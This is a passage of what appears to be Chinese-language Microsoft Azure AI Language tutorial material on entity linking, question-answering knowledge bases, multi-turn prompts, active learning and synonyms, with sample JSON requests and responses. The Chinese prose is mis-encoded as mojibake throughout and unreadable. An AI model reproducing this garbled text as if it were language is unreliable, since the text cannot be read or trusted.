&quot;subcategory&quot;:&quot;GPE&quot;, &quot;offset&quot;:12, &quot;length&quot;:6, &quot;confidenceScore&quot;:0.88 &#125;, &#123; &quot;text&quot;:&quot;Saturday&quot;, &quot;category&quot;:&quot;DateTime&quot;, &quot;subcategory&quot;:&quot;Date&quot;, &quot;offset&quot;:22, &quot;length&quot;:8, &quot;confidenceScore&quot;:0.8 &#125; ], &quot;id&quot;:&quot;1&quot;, &quot;warnings&quot;:[] &#125; ], &quot;errors&quot;:[], &quot;modelVersion&quot;:&quot;2021-01-15&quot; &#125;&#125; è‹¥è¦äº†è§£æœ‰å…³å®ä½“çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ç”Ÿæˆå¯¹è¯è¯­è¨€ç†è§£æ¨¡å‹æ¨¡å—ã€‚ æå–é“¾æ¥çš„å®ä½“åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç›¸åŒçš„åç§°å¯èƒ½é€‚ç”¨äºå¤šä¸ªå®ä½“ã€‚ ä¾‹å¦‚ï¼Œâ€œVenusâ€ä¸€è¯çš„å®ä¾‹æ˜¯æŒ‡è¡Œæ˜Ÿè¿˜æ˜¯ç¥è¯ä¸­çš„å¥³ç¥ï¼Ÿ å®ä½“é“¾æ¥å¯ç”¨äºé€šè¿‡å¼•ç”¨çŸ¥è¯†åº“ä¸­çš„æ–‡ç« æ¥åŒºåˆ†åŒåçš„å®ä½“ã€‚ ç»´åŸºç™¾ç§‘ä¸ºæ–‡æœ¬åˆ†ææœåŠ¡æä¾›äº†çŸ¥è¯†åº“ã€‚ æ ¹æ®æ–‡æœ¬ä¸­çš„å®ä½“ä¸Šä¸‹æ–‡ç¡®å®šç‰¹å®šæ–‡ç« é“¾æ¥ã€‚ ä¾‹å¦‚ï¼Œâ€œI saw Venus shining in the skyâ€ä¸é“¾æ¥ https://en.wikipedia.org/wiki/Venus ç›¸å…³è”ï¼Œè€Œâ€œVenus, the goddess of beautyâ€ä¸ https://en.wikipedia.org/wiki/Venus_(mythology) ç›¸å…³è”ã€‚ ä¸æ‰€æœ‰ Azure AI è¯­è¨€æœåŠ¡å‡½æ•°ä¸€æ ·ï¼Œä½ å¯ä»¥æäº¤ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡æ¡£è¿›è¡Œåˆ†æï¼š 12345678910111213141516&#123; &quot;kind&quot;: &quot;EntityLinking&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: &quot;I saw Venus shining in the sky&quot; &#125; ] &#125;&#125; å“åº”åŒ…æ‹¬æ–‡æœ¬ä¸­æ ‡è¯†çš„å®ä½“ä»¥åŠæŒ‡å‘ç›¸å…³æ–‡ç« çš„é“¾æ¥ï¼š 12345678910111213141516171819202122232425262728293031&#123; &quot;kind&quot;: &quot;EntityLinkingResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;entities&quot;: [ &#123; &quot;bingId&quot;: &quot;89253af3-5b63-e620-9227-f839138139f6&quot;, &quot;name&quot;: &quot;Venus&quot;, &quot;matches&quot;: [ &#123; &quot;text&quot;: &quot;Venus&quot;, &quot;offset&quot;: 6, &quot;length&quot;: 5, &quot;confidenceScore&quot;: 0.01 &#125; ], &quot;language&quot;: &quot;en&quot;, &quot;id&quot;: &quot;Venus&quot;, &quot;url&quot;: &quot;https://en.wikipedia.org/wiki/Venus&quot;, &quot;dataSource&quot;: &quot;Wikipedia&quot; &#125; ], &quot;warnings&quot;: [] &#125; ], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2021-06-01&quot; &#125;&#125; æƒ…ç»ªåˆ†ææœ‰åŠ©äºç¡®å®šæ–‡æœ¬æ˜¯è´Ÿé¢çš„è¿˜æ˜¯æ­£é¢çš„é“¾æ¥çš„å®ä½“å¯ç”¨äºåŒºåˆ†åŒåçš„å¸¸è§å®ä½“ ä½¿ç”¨ Azure AI è¯­è¨€åˆ›å»ºé—®é¢˜è§£ç­”è§£å†³æ–¹æ¡ˆæ™ºèƒ½â€åº”ç”¨ç¨‹åºçš„å¸¸è§æ¨¡å¼æ˜¯ä½¿ç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨è‡ªç„¶è¯­è¨€æé—®å¹¶æ”¶åˆ°ç›¸åº”çš„ç­”æ¡ˆã€‚ å®é™…ä¸Šï¼Œæ­¤ç±»è§£å†³æ–¹æ¡ˆå°†å¯¹è¯æ™ºèƒ½å¼•å…¥ä¼ ç»Ÿçš„å¸¸è§é—®é¢˜è§£ç­” (FAQ) å‘å¸ƒã€‚ æœ¬æ¨¡å—ä»‹ç»å¦‚ä½•ä½¿ç”¨ Azure AI è¯­è¨€åˆ›å»ºå¯æ”¯æŒåº”ç”¨ç¨‹åºæˆ–æœºå™¨äººçš„é—®ç­”å¯¹çŸ¥è¯†åº“ã€‚ äº†è§£é—®é¢˜è§£ç­”åŠå…¶ä¸è¯­è¨€ç†è§£çš„æ¯”è¾ƒã€‚åˆ›å»ºã€æµ‹è¯•ã€å‘å¸ƒå’Œä½¿ç”¨çŸ¥è¯†åº“ã€‚å®ç°å¤šå›åˆå¯¹è¯å’Œä¸»åŠ¨å­¦ä¹ ã€‚åˆ›å»ºä½¿ç”¨è‡ªç„¶è¯­è¨€è¿›è¡Œäº¤äº’çš„é—®é¢˜è§£ç­”æœºå™¨äººã€‚ äº†è§£é—®é¢˜è§£ç­”å·²å®Œæˆ å€ŸåŠ©åŒ…æ‹¬é—®é¢˜è§£ç­”åŠŸèƒ½çš„ Azure AI è¯­è¨€ï¼Œå¯ä»¥å®šä¹‰å¯ä½¿ç”¨è‡ªç„¶è¯­è¨€è¾“å…¥æŸ¥è¯¢çš„é—®ç­”å¯¹çŸ¥è¯†åº“ã€‚ çŸ¥è¯†åº“å¯ä»¥å‘å¸ƒåˆ° REST ç»ˆç»“ç‚¹ï¼Œå¹¶ä¾›å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºï¼ˆé€šå¸¸æ˜¯æœºå™¨äººï¼‰ä½¿ç”¨ã€‚ å¯ä»¥ä»ç°æœ‰æºåˆ›å»ºçŸ¥è¯†åº“ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š åŒ…å«å¸¸è§é—®é¢˜è§£ç­” (FAQ) æ–‡æ¡£çš„ç½‘ç«™ã€‚ åŒ…å«ç»“æ„åŒ–æ–‡æœ¬çš„æ–‡ä»¶ï¼Œå¦‚æ‰‹å†Œæˆ–ç”¨æˆ·æŒ‡å—ã€‚ å†…ç½®çš„é—²èŠé—®é¢˜å’Œç”¨äºå°è£…å¸¸è§å¯¹è¯äº¤æµçš„ç­”æ¡ˆå¯¹ã€‚ æ³¨æ„ Azure AI è¯­è¨€çš„é—®é¢˜è§£ç­”åŠŸèƒ½æ˜¯ QnA æœåŠ¡çš„è¾ƒæ–°ç‰ˆæœ¬ï¼Œè¯¥æœåŠ¡ä»ä½œä¸ºç‹¬ç«‹çš„æœåŠ¡å­˜åœ¨ã€‚ è‹¥è¦äº†è§£å¦‚ä½•å°† QnA Maker çŸ¥è¯†åº“è¿ç§»åˆ° Azure AI è¯­è¨€ï¼Œè¯·å‚é˜…è¿ç§»æŒ‡å—ã€‚ æ¯”è¾ƒé—®é¢˜è§£ç­”å’Œ Azure AI è¯­è¨€ç†è§£å·²å®Œæˆ é—®é¢˜è§£ç­”çŸ¥è¯†åº“æ˜¯è¯­è¨€æ¨¡å‹çš„ä¸€ç§å½¢å¼ï¼Œå®ƒä¼šæå‡ºæœ‰å…³ä½•æ—¶ä½¿ç”¨é—®é¢˜è§£ç­”çš„é—®é¢˜ï¼Œä»¥åŠä½•æ—¶ä½¿ç”¨ Azure AI è¯­è¨€çš„å¯¹è¯è¯­è¨€ç†è§£åŠŸèƒ½ã€‚ è¿™ä¸¤é¡¹åŠŸèƒ½çš„ç›¸ä¼¼ä¹‹å¤„åœ¨äºï¼Œå®ƒä»¬éƒ½å…è®¸å®šä¹‰å¯ä»¥ä½¿ç”¨è‡ªç„¶è¯­è¨€è¡¨è¾¾å¼æŸ¥è¯¢çš„è¯­è¨€æ¨¡å‹ã€‚ ä½†æ˜¯ï¼Œå®ƒä»¬æ—¨åœ¨è§£å†³çš„ç”¨ä¾‹å­˜åœ¨ä¸€äº›å·®å¼‚ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š é—®ç­” è¯­è¨€ç†è§£ ä½¿ç”¨æ¨¡å¼ ç”¨æˆ·æäº¤é—®é¢˜ï¼Œéœ€è¦ç­”æ¡ˆ ç”¨æˆ·æäº¤è¨€è¯­ï¼Œéœ€è¦é€‚å½“çš„å“åº”æˆ–æ“ä½œ æŸ¥è¯¢å¤„ç† æœåŠ¡ä½¿ç”¨è‡ªç„¶è¯­è¨€ç†è§£å°†é—®é¢˜ä¸çŸ¥è¯†åº“ä¸­çš„ç­”æ¡ˆè¿›è¡ŒåŒ¹é… æœåŠ¡ä½¿ç”¨è‡ªç„¶è¯­è¨€ç†è§£æ¥è§£é‡Šè¨€è¯­ã€å°†å…¶ä¸æ„å‘åŒ¹é…ï¼Œä»¥åŠè¯†åˆ«å®ä½“ å“åº” å“åº”æ˜¯å·²çŸ¥é—®é¢˜çš„é™æ€ç­”æ¡ˆ å“åº”æŒ‡ç¤ºæœ€æœ‰å¯èƒ½çš„æ„å‘å’Œå¼•ç”¨å®ä½“ å®¢æˆ·ç«¯é€»è¾‘ å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºé€šå¸¸å‘ç”¨æˆ·æä¾›ç­”æ¡ˆ å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºè´Ÿè´£æ ¹æ®æ£€æµ‹åˆ°çš„æ„å‘æ‰§è¡Œé€‚å½“çš„æ“ä½œ å®é™…ä¸Šï¼Œè¿™ä¸¤ä¸ªæœåŠ¡æ˜¯äº’è¡¥çš„ã€‚ å¯ä»¥æ„å»ºç»¼åˆçš„è‡ªç„¶è¯­è¨€è§£å†³æ–¹æ¡ˆï¼Œå°†è¯­è¨€ç†è§£æ¨¡å‹ä¸é—®é¢˜è§£ç­”çŸ¥è¯†åº“ç»“åˆèµ·æ¥ã€‚ åˆ›å»ºçŸ¥è¯†åº“è‹¥è¦åˆ›å»ºé—®é¢˜è§£ç­”è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥ä½¿ç”¨ REST API æˆ– SDK ç¼–å†™ç”¨äºå®šä¹‰ã€è®­ç»ƒå’Œå‘å¸ƒçŸ¥è¯†åº“çš„ä»£ç ã€‚ ä¸è¿‡ï¼Œæ›´å¸¸è§çš„æ˜¯ä½¿ç”¨ Language Studio Web ç•Œé¢æ¥å®šä¹‰å’Œç®¡ç†çŸ¥è¯†åº“ã€‚ è‹¥è¦åˆ›å»ºçŸ¥è¯†åº“ï¼Œè¯·æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š ç™»å½•åˆ° Azure é—¨æˆ·ã€‚ ä½¿ç”¨é—¨æˆ·é¡¶éƒ¨çš„æœç´¢å­—æ®µæœç´¢â€œAzure AI æœåŠ¡â€ã€‚ é€‰æ‹©â€œè¯­è¨€æœåŠ¡â€èµ„æºä¸‹çš„â€œåˆ›å»ºâ€ã€‚ åœ¨ Azure è®¢é˜…ä¸­åˆ›å»ºèµ„æºï¼š å¯ç”¨é—®é¢˜è§£ç­”åŠŸèƒ½ã€‚ åˆ›å»ºæˆ–é€‰æ‹©â€œAzure AI æœç´¢â€èµ„æºæ¥æ‰˜ç®¡çŸ¥è¯†åº“ç´¢å¼•ã€‚ åœ¨ Language Studio ä¸­ï¼Œé€‰æ‹©â€œAzure AI è¯­è¨€â€èµ„æºå¹¶åˆ›å»ºâ€œè‡ªå®šä¹‰é—®é¢˜è§£ç­”â€é¡¹ç›®ã€‚ æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®æºä»¥å¡«å……çŸ¥è¯†åº“ï¼š åŒ…å« FAQ çš„ Web é¡µé¢çš„ URLã€‚ åŒ…å«å¯ä»¥ä»ä¸­æ´¾ç”Ÿå‡ºé—®é¢˜å’Œè§£ç­”çš„ç»“æ„åŒ–æ–‡æœ¬çš„æ–‡ä»¶ã€‚ é¢„å®šä¹‰çš„é—²èŠæ•°æ®é›†ï¼Œå…¶ä¸­åŒ…æ‹¬æŒ‡å®šæ ·å¼çš„å¸¸è§å¯¹è¯é—®é¢˜å’Œå“åº”ã€‚ åœ¨é—¨æˆ·ä¸­ç¼–è¾‘é—®ç­”å¯¹ã€‚ å®ç°å¤šå›åˆå¯¹è¯å·²å®Œæˆ å°½ç®¡é€šå¸¸å¯ä»¥åˆ›å»ºç”±å•ä¸ªé—®ç­”å¯¹ç»„æˆçš„æœ‰æ•ˆçŸ¥è¯†åº“ï¼Œä½†æœ‰æ—¶å¯èƒ½éœ€è¦åœ¨æä¾›æ˜ç¡®ç­”æ¡ˆä¹‹å‰è¯¢é—®åç»­é—®é¢˜ï¼Œä»¥ä¾¿ä»ç”¨æˆ·é‚£é‡Œè·å–æ›´å¤šä¿¡æ¯ã€‚ è¿™ç§äº¤äº’ç§°ä¸ºå¤šå›åˆå¯¹è¯ã€‚ æ ¹æ®ç°æœ‰ç½‘é¡µæˆ–æ–‡æ¡£çš„ç»“æ„ä»ç°æœ‰ç½‘é¡µæˆ–æ–‡æ¡£ä¸­å¯¼å…¥é—®ç­”æ—¶ï¼Œå¯ä»¥å¯ç”¨å¤šå›åˆå“åº”ï¼Œæˆ–è€…å¯ä»¥ä¸ºç°æœ‰é—®ç­”å¯¹æ˜¾å¼å®šä¹‰è·Ÿè¿›æç¤ºå’Œå“åº”ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾æ—…è¡Œé¢„è®¢çŸ¥è¯†åº“çš„åˆå§‹é—®é¢˜æ˜¯â€œå¦‚ä½•å–æ¶ˆé¢„è®¢ï¼Ÿâ€ã€‚ é¢„è®¢å¯èƒ½æŒ‡é…’åº—æˆ–èˆªç­ï¼Œå› æ­¤éœ€è¦è·Ÿè¿›æç¤ºæ¥é˜æ˜æ­¤è¯¦ç»†ä¿¡æ¯ã€‚ ç­”æ¡ˆå¯èƒ½åŒ…å«â€œå–æ¶ˆç­–ç•¥å–å†³äºé¢„è®¢ç±»å‹â€ä¹‹ç±»çš„æ–‡æœ¬ï¼Œå¹¶åŒ…å«è·Ÿè¿›æç¤ºï¼Œä»¥åŠæœ‰å…³å–æ¶ˆèˆªç­å’Œå–æ¶ˆé…’åº—çš„ç­”æ¡ˆé“¾æ¥ã€‚ å®šä¹‰å¤šå›åˆå¯¹è¯çš„è·Ÿè¿›æç¤ºæ—¶ï¼Œå¯ä»¥é“¾æ¥åˆ°çŸ¥è¯†åº“ä¸­çš„ç°æœ‰ç­”æ¡ˆï¼Œæˆ–ä¸“é—¨ä¸ºè·Ÿè¿›å®šä¹‰æ–°ç­”æ¡ˆã€‚ è¿˜å¯ä»¥é™åˆ¶é“¾æ¥ç­”æ¡ˆï¼Œä»¥ä¾¿å®ƒä»…æ˜¾ç¤ºåœ¨ç”±åŸå§‹é—®é¢˜å‘èµ·çš„å¤šå›åˆå¯¹è¯çš„ä¸Šä¸‹æ–‡ä¸­ã€‚ æµ‹è¯•å¹¶å‘å¸ƒçŸ¥è¯†åº“â€‹â€‹å®šä¹‰çŸ¥è¯†åº“åï¼Œå¯ä»¥è®­ç»ƒå…¶è‡ªç„¶è¯­è¨€æ¨¡å‹å¹¶æµ‹è¯•è¯¥æ¨¡å‹ï¼Œç„¶åå‘å¸ƒï¼Œä»¥ä¾¿åœ¨åº”ç”¨ç¨‹åºæˆ–æœºå™¨äººä¸­ä½¿ç”¨ã€‚â€‹ æµ‹è¯•çŸ¥è¯†åº“â€‹ä½ å¯ä»¥åœ¨è¯­è¨€å·¥ä½œå®¤ä¸­ï¼Œé€šè¿‡æäº¤é—®é¢˜å¹¶æŸ¥çœ‹è¿”å›çš„ç­”æ¡ˆæ¥äº¤äº’æµ‹è¯•çŸ¥è¯†åº“ã€‚ å¯ä»¥æ£€æŸ¥ç»“æœä»¥æŸ¥çœ‹å…¶ç½®ä¿¡åº¦åˆ†æ•°ä»¥åŠå…¶ä»–å¯èƒ½çš„ç­”æ¡ˆã€‚â€‹â€‹ éƒ¨ç½²çŸ¥è¯†åº“â€‹å¦‚æœå¯¹çŸ¥è¯†åº“çš„æ€§èƒ½æ»¡æ„ï¼Œå¯ä»¥å°†å…¶éƒ¨ç½²åˆ° REST ç»ˆç»“ç‚¹ï¼Œå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨è¯¥å‡½æ•°æ¥æäº¤é—®é¢˜å’Œæ¥æ”¶ç­”æ¡ˆã€‚ å¯ä»¥ç›´æ¥ä» Language Studio éƒ¨ç½²å®ƒã€‚â€‹ ä½¿ç”¨çŸ¥è¯†åº“è‹¥è¦ä½¿ç”¨å·²å‘å¸ƒçš„çŸ¥è¯†åº“ï¼Œå¯ä»¥ä½¿ç”¨ REST æ¥å£ã€‚ å‡½æ•°çš„æœ€å°è¯·æ±‚æ­£æ–‡åŒ…å«ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011&#123; &quot;question&quot;: &quot;What do I need to do to cancel a reservation?&quot;, &quot;top&quot;: 2, &quot;scoreThreshold&quot;: 20, &quot;strictFilters&quot;: [ &#123; &quot;name&quot;: &quot;category&quot;, &quot;value&quot;: &quot;api&quot; &#125; ]&#125; properties è¯´æ˜ é—®é¢˜ è¦å‘é€åˆ°çŸ¥è¯†åº“çš„é—®é¢˜ã€‚ top è¦è¿”å›çš„æœ€å¤§ç­”æ¡ˆæ•°ã€‚ scoreThreshold è¿”å›çš„ç­”æ¡ˆçš„åˆ†æ•°é˜ˆå€¼ã€‚ strictFilters é™åˆ¶ä¸ºä»…åŒ…å«æŒ‡å®šå…ƒæ•°æ®çš„ç­”æ¡ˆã€‚ å“åº”åŒ…æ‹¬çŸ¥è¯†åº“ä¸­æœ€æ¥è¿‘çš„é—®é¢˜åŒ¹é…ï¼Œä»¥åŠå…³è”çš„ç­”æ¡ˆã€ç½®ä¿¡åº¦åˆ†æ•°å’Œæœ‰å…³é—®ç­”å¯¹çš„å…¶ä»–å…ƒæ•°æ®ï¼š 12345678910111213141516171819&#123; &quot;answers&quot;: [ &#123; &quot;score&quot;: 27.74823341616769, &quot;id&quot;: 20, &quot;answer&quot;: &quot;Call us on 555 123 4567 to cancel a reservation.&quot;, &quot;questions&quot;: [ &quot;How can I cancel a reservation?&quot; ], &quot;metadata&quot;: [ &#123; &quot;name&quot;: &quot;category&quot;, &quot;value&quot;: &quot;api&quot; &#125; ] &#125; ]&#125; æé«˜é—®é¢˜è§£ç­”æ€§èƒ½åˆ›å»ºå’Œæµ‹è¯•çŸ¥è¯†åº“åï¼Œå¯ä»¥é€šè¿‡â€œä¸»åŠ¨å­¦ä¹ â€å’Œå®šä¹‰â€œåŒä¹‰è¯â€æ¥æ”¹å–„å…¶æ€§èƒ½ã€‚ ä½¿ç”¨ä¸»åŠ¨å­¦ä¹ ä¸»åŠ¨å­¦ä¹ å¯å¸®åŠ©ä½ è¿›è¡ŒæŒç»­æ”¹è¿›ï¼Œä»¥ä¾¿éšç€æ—¶é—´çš„æ¨ç§»æ›´å¥½åœ°æ­£ç¡®å›ç­”ç”¨æˆ·é—®é¢˜ã€‚ äººä»¬ç»å¸¸ä¼šé—®ä¸€äº›æªè¾ä¸åŒä½†æœ€ç»ˆå«ä¹‰ç›¸åŒçš„é—®é¢˜ã€‚ åœ¨æ­¤ç±»æƒ…å†µä¸‹ï¼Œä¸»åŠ¨å­¦ä¹ ä¼šæœ‰æ‰€å¸®åŠ©ï¼Œå› ä¸ºå®ƒå¯ä»¥è®©ä½ è€ƒè™‘æ¯ä¸ªé—®ç­”å¯¹çš„å¤‡é€‰é—®é¢˜ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸»åŠ¨å­¦ä¹ å¤„äºå¯ç”¨çŠ¶æ€ã€‚ è‹¥è¦ä½¿ç”¨ä¸»åŠ¨å­¦ä¹ ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š åˆ›å»ºé—®ç­”å¯¹åœ¨ Language Studio ä¸­ä¸ºé¡¹ç›®åˆ›å»ºé—®é¢˜å’Œç­”æ¡ˆå¯¹ã€‚ è¿˜å¯ä»¥å¯¼å…¥åŒ…å«è¦æ‰¹é‡ä¸Šä¼ çš„é—®ç­”å¯¹çš„æ–‡ä»¶ã€‚ å®¡é˜…å»ºè®®ç„¶åï¼Œä¸»åŠ¨å­¦ä¹ å¼€å§‹ä¸ºé—®ç­”å¯¹ä¸­çš„æ¯ä¸ªé—®é¢˜æä¾›å¤‡é€‰é—®é¢˜ã€‚ å¯ä»â€œæŸ¥çœ‹å»ºè®®â€çª—æ ¼è®¿é—®æ­¤å†…å®¹ï¼š æŸ¥çœ‹ï¼Œç„¶åé€šè¿‡é€‰æ‹©å¤‡é€‰çŸ­è¯­æ—è¾¹çš„å¤é€‰æ ‡è®°æˆ–åˆ é™¤ç¬¦å·æ¥æ¥å—æˆ–æ‹’ç»é’ˆå¯¹æ¯ä¸ªé—®é¢˜å»ºè®®çš„è¿™äº›å¤‡é€‰çŸ­è¯­ã€‚ å¯ä»¥ä½¿ç”¨é¡¶éƒ¨çš„â€œæ¥å—æ‰€æœ‰å»ºè®®â€æˆ–â€œæ‹’ç»æ‰€æœ‰å»ºè®®â€é€‰é¡¹æ‰¹é‡æ¥å—æˆ–æ‹’ç»å»ºè®®ã€‚ åœ¨â€œç¼–è¾‘çŸ¥è¯†åº“â€çª—æ ¼ä¸­ä¸ºå¯¹é€‰æ‹©â€œæ·»åŠ å¤‡é€‰é—®é¢˜â€æ—¶ï¼Œè¿˜å¯ä»¥æ‰‹åŠ¨æ·»åŠ å¤‡é€‰é—®é¢˜ï¼š å®šä¹‰åŒä¹‰è¯å½“ç”¨æˆ·æäº¤çš„é—®é¢˜å¯èƒ½åŒ…å«å¤šä¸ªä¸åŒçš„å­—è¯æ¥è¡¨ç¤ºç›¸åŒå†…å®¹æ—¶ï¼ŒåŒä¹‰è¯å¾ˆæœ‰ç”¨ã€‚ ä¾‹å¦‚ï¼Œä¸€å®¶æ—…æ¸¸ä»£ç†å•†çš„å®¢æˆ·å¯èƒ½ä¼šæåˆ°â€œé¢„ç•™â€æˆ–â€œé¢„è®¢â€ã€‚ é€šè¿‡å°†è¿™äº›å…³é”®è¯å®šä¹‰ä¸ºåŒä¹‰è¯ï¼Œæ— è®ºä¸ªäººå®¢æˆ·ä½¿ç”¨å“ªä¸€æœ¯è¯­ï¼Œé—®é¢˜è§£ç­”æœåŠ¡éƒ½å¯ä»¥æ‰¾åˆ°ç›¸åº”çš„ç­”æ¡ˆã€‚ è‹¥è¦å®šä¹‰åŒä¹‰è¯ï¼Œè¯·ä½¿ç”¨ REST API æŒ‰ä»¥ä¸‹ JSON æ ¼å¼æäº¤åŒä¹‰è¯ï¼š 12345678910&#123; &quot;synonyms&quot;: [ &#123; &quot;alterations&quot;: [ &quot;reservation&quot;, &quot;booking&quot; ] &#125; ]&#125; å¯ä»¥ä»ç°æœ‰æ–‡æ¡£æˆ–ç½‘é¡µåˆ›å»ºçŸ¥è¯†åº“ã€‚è‹¥è¦å‘é—®é¢˜æ·»åŠ å¤šå›åˆä¸Šä¸‹æ–‡ï¼Œè¯·å®šä¹‰è·Ÿè¿›æç¤ºã€‚ä½ å¯ä»¥ä¸ºå·²å‘å¸ƒçš„çŸ¥è¯†åº“åˆ›å»ºæœºå™¨äººï¼Œå¹¶é…ç½®ç”µå­é‚®ä»¶é€šä¿¡é€šé“ã€‚ ç”Ÿæˆå¯¹è¯è¯­è¨€ç†è§£æ¨¡å‹ä»‹ç»è‡ªç„¶è¯­è¨€å¤„ç† (NLP) æ˜¯ä¸€ä¸ªå¸¸è§çš„ AI é—®é¢˜ï¼Œå³è½¯ä»¶å¿…é¡»èƒ½å¤Ÿä»¥äººç±»ç”¨æˆ·ä¹¦å†™æˆ–è¯´è¯æ‰€ç”¨çš„è‡ªç„¶è¯­è¨€å½¢å¼å¤„ç†æ–‡æœ¬æˆ–è¯­éŸ³ã€‚ åœ¨æ›´å¹¿æ³›çš„ NLP é¢†åŸŸä¸­ï¼Œè‡ªç„¶è¯­è¨€ç†è§£ (NLU) å¤„ç†ä»è‡ªç„¶è¯­è¨€ç¡®å®šè¯­ä¹‰å«ä¹‰çš„é—®é¢˜ï¼Œé€šå¸¸ä½¿ç”¨è®­ç»ƒçš„è¯­è¨€æ¨¡å‹æ¥ç¡®å®šã€‚ è‡ªç„¶è¯­è¨€ç†è§£è§£å†³æ–¹æ¡ˆçš„å¸¸è§è®¾è®¡æ¨¡å¼å¦‚ä¸‹æ‰€ç¤ºï¼š åœ¨æ­¤è®¾è®¡æ¨¡å¼ä¸­ï¼š åº”ç”¨æ¥å—æ¥è‡ªç”¨æˆ·çš„è‡ªç„¶è¯­è¨€è¾“å…¥ã€‚ è¯­è¨€æ¨¡å‹ç”¨äºç¡®å®šè¯­ä¹‰å«ä¹‰ï¼ˆç”¨æˆ·çš„æ„å‘ï¼‰ã€‚ åº”ç”¨æ‰§è¡Œç›¸åº”æ“ä½œã€‚ Azure AI è¯­è¨€ä½¿å¼€å‘äººå‘˜èƒ½å¤ŸåŸºäºå¯ä½¿ç”¨æ•°é‡ç›¸å¯¹è¾ƒå°‘çš„ç¤ºä¾‹è®­ç»ƒçš„è¯­è¨€æ¨¡å‹æ¥ç”Ÿæˆåº”ç”¨ï¼Œä»è€Œè¯†åˆ«ç”¨æˆ·çš„é¢„æœŸå«ä¹‰ã€‚ æœ¬æ¨¡å—ä»‹ç»å¦‚ä½•ç›¸å…³æœåŠ¡æ¥åˆ›å»ºä½¿ç”¨ Azure AI è¯­è¨€çš„è‡ªç„¶è¯­è¨€ç†è§£åº”ç”¨ã€‚ å®Œæˆæ­¤æ¨¡å—åï¼Œä½ å°†èƒ½å¤Ÿï¼š é¢„é… Azure AI è¯­è¨€èµ„æºã€‚ å®šä¹‰æ„å‘ã€å®ä½“å’Œè¯­å¥ã€‚ ä½¿ç”¨æ¨¡å¼åŒºåˆ†ç›¸ä¼¼çš„è¨€è¯­ã€‚ ä½¿ç”¨é¢„ç”Ÿæˆçš„å®ä½“ç»„ä»¶ã€‚ è®­ç»ƒã€æµ‹è¯•ã€å‘å¸ƒå’ŒæŸ¥çœ‹æ¨¡å‹ã€‚ äº†è§£ Azure AI è¯­è¨€æœåŠ¡çš„é¢„ç”ŸæˆåŠŸèƒ½Azure AI è¯­è¨€æœåŠ¡æä¾›å„ç§åŠŸèƒ½æ¥ç†è§£äººç±»è¯­è¨€ã€‚ å¯ä»¥ä½¿ç”¨æ¯é¡¹ç‰¹å¾æ›´å¥½åœ°ä¸ç”¨æˆ·é€šä¿¡ï¼Œæ›´å¥½åœ°äº†è§£ä¼ å…¥é€šä¿¡ï¼Œæˆ–è€…ä½¿ç”¨å¤šé¡¹ç‰¹å¾ä»¥ä¾¿æ›´æ·±å…¥åœ°äº†è§£ç”¨æˆ·æ‰€è¡¨è¾¾å†…å®¹ã€æ„å‘å’Œè¯¢é—®å†…å®¹ã€‚ Azure AI è¯­è¨€æœåŠ¡åŠŸèƒ½åˆ†ä¸ºä¸¤ç±»ï¼šé¢„é…ç½®çš„åŠŸèƒ½å’Œä¹ å¾—çš„åŠŸèƒ½ã€‚ å­¦ä¹ åˆ°çš„ç‰¹å¾éœ€è¦ç”Ÿæˆå’Œè®­ç»ƒä¸€ä¸ªæ¨¡å‹æ¥æ­£ç¡®é¢„æµ‹é€‚å½“çš„æ ‡ç­¾ï¼Œæœ¬æ¨¡å—å³å°†æ¨å‡ºçš„å•å…ƒå°†å¯¹æ­¤è¿›è¡Œä»‹ç»ã€‚ æœ¬å•å…ƒä¼šä»‹ç» Azure AI è¯­è¨€æœåŠ¡çš„å¤§éƒ¨åˆ†åŠŸèƒ½ï¼Œä½†è¯·å‚è€ƒ Azure AI è¯­è¨€æœåŠ¡æ–‡æ¡£è·å–å®Œæ•´åˆ—è¡¨ï¼Œå…¶ä¸­åŒ…æ‹¬å¿«é€Ÿå…¥é—¨å’Œæ‰€æœ‰å¯ç”¨å†…å®¹çš„å®Œæ•´è¯´æ˜ã€‚ åœ¨åº”ç”¨ä¸­ä½¿ç”¨è¿™äº›ç‰¹å¾éœ€è¦å°†æŸ¥è¯¢å‘é€åˆ°ç›¸åº”çš„ç»ˆç»“ç‚¹ã€‚ ç”¨äºæŸ¥è¯¢ç‰¹å®šç‰¹å¾çš„ç»ˆç»“ç‚¹å„ä¸ç›¸åŒï¼Œä½†æ‰€æœ‰è¿™äº›ç»ˆç»“ç‚¹éƒ½å¸¦æœ‰åœ¨ Azure å¸æˆ·ä¸­åˆ›å»ºçš„ Azure AI è¯­è¨€èµ„æºå‰ç¼€ï¼Œæ— è®ºæ˜¯ç”Ÿæˆ REST è¯·æ±‚ï¼Œè¿˜æ˜¯ä½¿ç”¨ SDK å®šä¹‰å®¢æˆ·ç«¯ã€‚ å¯ä»¥åœ¨ä¸‹ä¸€ä¸ªå•å…ƒä¸­æ‰¾åˆ°æ¯ä¸ªç¤ºä¾‹ã€‚ é¢„é…ç½®çš„åŠŸèƒ½Azure AI 